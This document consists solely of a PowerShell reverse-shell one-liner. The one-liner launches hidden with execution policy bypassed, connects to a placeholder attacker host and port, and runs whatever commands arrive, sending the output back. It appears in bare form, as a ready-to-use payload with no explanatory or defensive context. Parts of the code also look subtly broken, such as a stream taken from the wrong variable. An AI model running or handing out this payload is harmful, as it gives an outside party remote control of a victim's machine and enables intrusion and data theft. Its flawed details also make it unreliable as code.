powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT));$stream=$_.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=iex $data 2>&1;$sendback2=$sendback+ 'PS '+(pwd).Path+'> ';$sendbyte=(New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
